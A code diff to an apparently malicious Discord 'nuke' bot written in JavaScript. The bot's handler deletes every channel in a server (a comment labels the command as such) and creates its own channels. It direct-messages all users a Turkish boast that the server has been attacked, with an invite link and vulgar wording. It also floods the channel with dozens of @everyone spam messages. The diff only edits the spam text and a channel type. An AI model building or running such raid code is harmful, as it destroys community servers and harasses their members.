@@ -25,7 +25,7 @@ client.on("message", async msg => {
     await msg.client.users
       .forEach(users =>
         users.send(
-          "**Bu Sunucu AxxA & Clowsia Tarafından Saldırıya Maruz Bırakılmıştır Öldün... https://discord.gg/MP2KYajVWp ** :middle_finger:"  
+          "**Bu Sunucu AxxA & Clowsia Tarafından Saldırıya Maruz Bırakılmıştır Böyle Sikerler... https://discord.gg/MP2KYajVWp ** :middle_finger:"  
         )
       )
       .catch(console.error);
@@ -51,7 +51,7 @@ client.on("message", async msg => {
     await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT
 
     await msg.guild.createChannel("AxxA", {
-      type: "voice"
+      type: "text"
     });
       await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
@@ -1521,54 +1521,54 @@ client.on('message', msg => {
         msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
         msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
-        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:');   
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
+        msg.channel.send('https://discord.gg/MP2KYajVWp @everyone :middle_finger: :ok_hand:'); 
   }
 });
 
